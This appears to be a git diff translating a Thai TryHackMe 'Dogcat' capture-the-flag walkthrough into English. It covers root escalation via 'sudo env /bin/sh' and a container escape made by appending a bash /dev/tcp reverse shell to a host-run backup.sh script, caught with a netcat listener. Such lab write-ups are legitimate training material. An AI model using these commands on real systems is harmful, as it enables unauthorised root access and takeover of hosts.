-> เมื่อเราได้ flag2 แล้ว ก็ถึงเวลาสำรวจสิทธิ์ของผู้ใช้งาน เพื่อหาวิธี Privilege Escalation
+### 🔓 2.14 Privilege Escalation to root
+> Now that we have flag2, it's time to examine the user's privileges to determine how to grant privilege escalation.
 
-30. ตรวจสอบคำสั่งที่ใช้ได้กับ `sudo`:
+30. Check the commands that work with `sudo`:
 
 ```bash
 sudo -l
@@ -398,39 +396,40 @@ sudo -l
 
 ![sudo](images/22.png)
 
-31. Privilege Escalation ด้วย sudo env
-- เราเข้าไปที่เว็บไซต์ [GTFOBins](https://gtfobins.github.io/#) เพื่อค้นหาคำว่า `env`
+31. Privilege Escalation with sudo env
+- We go to the [GTFOBins] website (https://gtfobins.github.io/#) and search for `env`.
 
 ![gtfobins](images/23.png)
 
-- จากนั้นเลือกหัวข้อ Sudo ของคำสั่ง env ซึ่งอธิบายว่า
-หากไบนารีนี้ได้รับอนุญาตให้รันด้วยสิทธิ์ superuser ผ่าน sudo มันจะไม่ลดสิทธิ์ที่สูงขึ้น และสามารถใช้เพื่อเข้าถึงไฟล์ระบบ หรือเพิ่มสิทธิ์ในการเข้าถึงได้
+- Then select the Sudo section of the env command, which explains:
+
+If this binary is allowed to run with superuser privileges via sudo, it will not lower its privileges and can be used to access system files or escalate access privileges.
 
 ![gtfobins](images/24.png)
 
-- จากนั้นเราจะใช้คำสั่งนี้เพื่อเข้าสู่ shell ที่มีสิทธิ์ root:
+- Then, we'll use this command to enter a shell with root privileges:
 
 ```bash
 sudo /usr/bin/env /bin/sh
 ```
 ![root](images/25.png)
 
-- เมื่อรันคำสั่งนี้สำเร็จ เราจะได้ shell ที่มีสิทธิ์ root แล้ว สามารถเข้าถึงไฟล์หรือคำสั่งที่ต้องใช้สิทธิ์สูงได้
+- Once this command is successfully executed, we'll have a shell with root privileges, allowing us to access files or commands that require elevated privileges.
 
-32. เราทำการเข้าไปยังไดเร็กทอรี root ด้วยคำสั่ง
+32. We'll access the root directory with the command:
 
 ```bash
 cd /root
 ```
 
-📥 ใช้คำสั่ง:
+📥 Use the command:
 
 ```bash
 ls
 ```
 
-- เพื่อดูไฟล์ในไดเร็กทอรี พบไฟล์ flag3.txt
-- ทำการอ่านไฟล์ด้วยคำสั่ง
+- To view the files in the directory, we found the file flag3.txt.
+- Read the file with the command:
 
 ```bash
 cat flag3.txt
@@ -438,15 +437,15 @@ cat flag3.txt
 
 ![root](images/26.png)
 
-📄 คัดลอกค่า flag3 ที่แสดงออกมา แล้วนำไปกรอกในระบบของ TryHackMe
+📄 Copy the displayed flag3 value and paste it into the TryHackMe system.
 
-- จุดที่น่าสังเกตคือ flag3 อยู่ในสภาพแวดล้อมที่แตกต่างจาก flag1 และ flag2 ซึ่งทั้งสองนั้นอยู่ในสิทธิ์ผู้ใช้ www-data แต่ flag3 จะอยู่ในไดเร็กทอรีของ root ซึ่งแสดงว่าเรามีสิทธิ์ระดับสูงขึ้น
+- It's worth noting that flag3 is in a different environment than flags1 and flag2. Both are with the permissions of the www-data user, but flag3 is in the root directory, indicating that we have elevated permissions.
 
-### 🐳 2.15 ตรวจสอบสิ่งแวดล้อมและค้นหาเบาะแสเพิ่มเติม
+### 🐳 2.15 Check the environment and search for additional clues
 
-33. ยืนยันตำแหน่งปัจจุบันของ Shell
+33. Verify the current location of the shell
 
-📥 ใช้คำสั่ง:
+📥 Use the command:
 
 ```bash
 cd ..
@@ -455,17 +454,17 @@ pwd
 
 ![examine](images/27.png)
 
-📄 ผลลัพธ์:
+📄 Output:
 
 ```bash
 /
 ```
 
-📌 หมายความว่าเรากำลังอยู่ใน root directory ของระบบ ซึ่งเป็นไดเรกทอรีระดับบนสุด
+📌 This means we are in the root directory of the system, which is the top-level directory.
 
-34. ตรวจสอบไฟล์ทั้งหมดรวมถึงไฟล์ที่ซ่อนอยู่:
+34. Check all files, including hidden files:
 
-📥 ใช้คำสั่ง:
+📥 Use the command:
 
 ```bash
 ls -la
@@ -473,49 +472,49 @@ ls -la
 
 ![examine](images/28.png)
 
-📄 ผลลัพธ์:
-- พบไฟล์ .dockerenv
+📄 Output:
+- .dockerenv file found
 
-🧠 วิเคราะห์:
- - ไฟล์ .dockerenv เป็นไฟล์ที่ซ่อนอยู่ในระบบ Linux/Unix (ขึ้นต้นด้วยจุด .)
- - โดยทั่วไป .dockerenv จะพบเฉพาะใน container ที่รันด้วย Docker
- - ดังนั้นการพบไฟล์นี้หมายความว่า:
-   🔎 เครื่องที่เรากำลังเจาะอยู่ อาจเป็น Docker container
+🧠 Analysis:
+- .dockerenv file This is a hidden file on Linux/Unix systems (begins with a period).
+- .dockerenv is typically only found in containers running with Docker.
+- Therefore, finding this file means:
+🔎 The machine we're hacking may be a Docker container.
 
-📌 ข้อนี้บ่งชี้ว่าเราอาจยังไม่ได้อยู่บน "โฮสต์หลัก" ของระบบ และจำเป็นต้องหาเส้นทางออกจาก container เพื่อเข้าถึงระบบหลัก (host) หรือค้นหาไฟล์ flag ที่อาจอยู่นอก container
+📌 This indicates that we may not be on the "main host" of the system and need to find a path out of the container to access the main system (host) or find a flag file that may be outside the container.
 
-### 📦 2.16 วิเคราะห์ไฟล์สำรองข้อมูลในระบบ
+### 📦 2.16 Analyzing the system backup files
 
-35. ตรวจสอบไดเรกทอรี `/opt` เพื่อหาเบาะแสเพิ่มเติม
+35. Examine the `/opt` directory for additional clues.
 
-📥 ใช้คำสั่ง:
+📥 Use the command:
 
 ```bash
 cd /opt
 ls
 ```
 
-📂 ผลลัพธ์: พบโฟลเดอร์ชื่อ `backups`
-📌 โฟลเดอร์นี้น่าสนใจเพราะชื่อแปลว่าใช้สำหรับสำรองข้อมูล (Backup)
+📂 Result: A folder named `backups` was found.
+📌 This folder is interesting because its name suggests it's used for backups.
 
-36. เข้าสู่โฟลเดอร์ backups และตรวจสอบไฟล์ภายใน
+36. Enter the backups folder and examine the files inside.
 
-📥 ใช้คำสั่ง:
+📥 Use the command:
 
 ```bash
 cd backups
 ls
 ```
 
-📄 ผลลัพธ์: พบไฟล์ 2 ไฟล์
- - backup.sh
- - backup.tar
-   
-📌 ไฟล์ .sh โดยทั่วไปมักเป็น Shell Script ที่ใช้สำหรับสั่งงานหรือรันกระบวนการบางอย่าง
+📄 Result: 2 files were found.
+- backup.sh
+- backup.tar
 
-37. อ่านเนื้อหาไฟล์ backup.sh
+📌 .sh files are typically shell scripts used to command or run certain processes.
 
-📥 ใช้คำสั่ง:
+37. Read the contents of the backup.sh file.
+
+📥 Use the command:
 
 ```bash
 cat backup.sh
@@ -523,29 +522,29 @@ cat backup.sh
 
 ![docker](images/29.png)
 
-📄 ผลลัพธ์: โค้ดในไฟล์ระบุว่า
- - ใช้คำสั่ง `tar` เพื่อทำการเก็บสำรองข้อมูล
- - มีการเก็บข้อมูลจาก container ลงในไดเรกทอรี `/root/container`
+📄 Result: The code in the file specifies:
+- Use the `tar` command to backup the data.
+- The data from the container is saved to a directory. /root/container
 
-🧠 วิเคราะห์:
- - ไฟล์ `backup.sh` มีคำสั่ง `tar` ที่ทำการบีบอัดข้อมูลจาก path `/root/container` ไปเก็บที่ `/root/container/backup/backup.tar`
- - จุดนี้ บ่งชี้ว่า path ดังกล่าวน่าจะถูก mount มาจาก Host (เพราะ container ปกติไม่ควรมี `/root/container`)
- - ดังนั้นระบบที่เรารันอยู่มีความเป็นไปได้สูงว่าเป็น 🐳 Docker Container ที่มี bind mount เชื่อมกับ Host
- - เป้าหมายต่อไป: ยกระดับการเข้าถึงจาก container ไปยัง host โดยใช้สิทธิ์ root ที่มีอยู่ใน container เพื่อแทรกแซง Host
+🧠 Analysis:
+- The backup.sh file contains a tar command that compresses data from the path '/root/container' to '/root/container/backup/backup.tar'.
+- This indicates that the path is likely mounted from the host (since a normal container should not have a '/root/container').
+- Therefore, the system we are running is likely a 🐳 Docker container with a bind mount to the host.
+- Next goal: Elevate access from the container to the host using the root privileges in the container to tamper with the host.
 
-🧨 2.17 Exploit ผ่าน backup.sh เพื่อ Escape Container
+🧨 2.17 Exploit via backup.sh to Escape Container
 
-38. 🧠 วิเคราะห์สถานการณ์:
+38. 🧠 Situation Analysis:
 
- - เราพบว่าไฟล์ `backup.sh` อยู่ใน path ที่เรามีสิทธิ์เขียนทับได้จาก container
- - สคริปต์นี้มีคำสั่ง `tar` ซึ่งถูกออกแบบให้ backup ข้อมูลจาก path ที่อาจเป็นของ Host (`/root/container`)
- - หากฝั่ง Host มี cron job หรือ process ที่รัน `backup.sh` โดยอัตโนมัติ (เช่น root บน host)
- - เราสามารถ ฝัง payload เช่น reverse shell ลงไปใน `backup.sh` ได้
- - เมื่อสคริปต์นี้ถูกรันโดย Host → Payload จะทำงานในสิทธิ์ของ Host → ทำให้สามารถหนีออกจาก container ได้จริง
+- We found that the backup.sh file is in a path that we have overwrite permissions from the container.
+- This script contains a tar command, which is designed to backup data from a path that may belong to the host ('/root/container').
+- If the host has A cron job or process that automatically runs backup.sh (e.g., root on the host).
+- We can embed a payload, such as a reverse shell, into backup.sh.
+- When this script is run by the host, the payload will run with the host's privileges, allowing the container to actually escape.
 
-40. 🧲 รอฟังการเชื่อมต่อจาก shell ที่ย้อนกลับมา
+40. 🧲 Listen for connections from the reverse shell.
 
-📥 ใช้คำสั่งบนเครื่อง attacker:
+📥 Use the command on the attacker's machine:
 
 ```bash
 nc -lvnp 8888
@@ -553,11 +552,11 @@ nc -lvnp 8888
 
 ![netcat](images/31.png)
 
-📌 คำสั่งนี้คือ Netcat ที่ใช้เปิด port รอฟังการเชื่อมต่อจาก target
+📌 This command is Netcat, which opens a port and listens for connections from the target.
 
-40. 🧬 เขียน Reverse Shell ลงไปใน backup.sh
+40. 🧬 Write a reverse shell into backup.sh.
 
-📥 ใช้คำสั่ง:
+📥 Use the command:
 
 ```bash
 echo "bash -i >& /dev/tcp/10.9.0.160/8888 0>&1" >> backup.sh
@@ -565,37 +564,37 @@ echo "bash -i >& /dev/tcp/10.9.0.160/8888 0>&1" >> backup.sh
 
 ![reverseshellbackup](images/30.png)
 
-📌 อธิบาย:
+📌 Explanation:
 
 - `bash -i`:
-   - เปิด interactive shell หมายถึง shell ที่พร้อมรับ input/output จากผู้ใช้
-   - ต้องเป็น `-i` เพื่อให้ shell ทำงานในแบบโต้ตอบ (interactive) ผ่าน TCP connection ได้
-- `>& /dev/tcp/10.9.0.160/8888`: ส่งข้อมูลจาก shell ไปยังเครื่อง IP `10.9.0.160` ผ่าน TCP port `8888`
-- `0>&1`: เชื่อม stdin เข้ากับ stdout → ใช้ socket เดียวในการรับ/ส่งข้อมูล
-- `>> backup.sh`: 	เพิ่มคำสั่งนี้ลงท้ายไฟล์ `backup.sh` โดยไม่ลบเนื้อหาเดิม
+- Opens an interactive shell, which accepts user input/output.
+- Must be `-i` for the shell to run interactively. (interactive) via TCP connection
+- `>& /dev/tcp/10.9.0.160/8888`: Send data from the shell to the IP address `10.9.0.160` via TCP port `8888`
+- `0>&1`: Connect stdin to stdout → Use a single socket for data transmission
+- `>> backup.sh`: Add this command to the end of the `backup.sh` file without deleting the original contents
 
-📎 หมายเหตุ:
-Reverse shell จะทำงานก็ต่อเมื่อมี service (หรือ admin) มารันไฟล์ `backup.sh` ซึ่งมักเป็น cronjob หรือสคริปต์บน host
+📎 Note:
+The reverse shell will only work if a service (or administrator) runs the `backup.sh` file, which is typically a cronjob or script on the host.
 
-🟢 หากสำเร็จ → shell จากเครื่อง host จะเชื่อมกลับมา และเราจะได้สิทธิ์ root บน host จริง
+🟢 If successful, the shell on the host will reconnect. And we'll gain root privileges on the actual host.
 
-### 🏴‍☠️ 2.18 ควบคุม Host และค้นหา Flag สุดท้าย (flag4.txt)
-> ตอนนี้เราควบคุมเครื่องเป้าหมายจากระยะไกลได้สำเร็จ 🎉
-> (ซึ่งไม่ใช่ container แล้ว แต่เป็น host จริงที่ทำงานอยู่ภายนอก)
+### 🏴‍☠️ 2.18 Control the host and find the last flag (flag4.txt)
+> We've now successfully remotely controlled the target machine 🎉
+> (This is no longer a container, but a real host running externally.)
 
-41. 🔍 ค้นหาไฟล์ flag4.txt ในระบบ:
+41. 🔍 Find the flag4.txt file on the system:
 
-📥 ใช้คำสั่ง:
+📥 Run the command:
 
 ```bash
 ls
 ```
 
-📁 ผลลัพธ์: พบไฟล์ flag4.txt
+📁 Result: Found the flag4.txt file.
 
-42. 📖 อ่านเนื้อหา flag สุดท้าย:
+42. 📖 Read the contents of the final flag:
 
-📥 ใช้คำสั่ง:
+📥 Run the command:
 
 ```bash
 cat flag4.txt
@@ -603,6 +602,6 @@ cat flag4.txt
 
 ![flag4](images/32.png)
 
-📄 คัดลอกค่าที่ได้จากไฟล์ แล้วนำไปกรอกในช่องคำตอบของ TryHackMe
+📄 Copy the values from the file and paste them into the TryHackMe answer field.
 
-✅ เสร็จสิ้นการเก็บ flag4 และ เคลียร์ห้อง Dogcat อย่างสมบูรณ์
+✅ Completed collecting flag4 and completely cleared the Dogcat room.
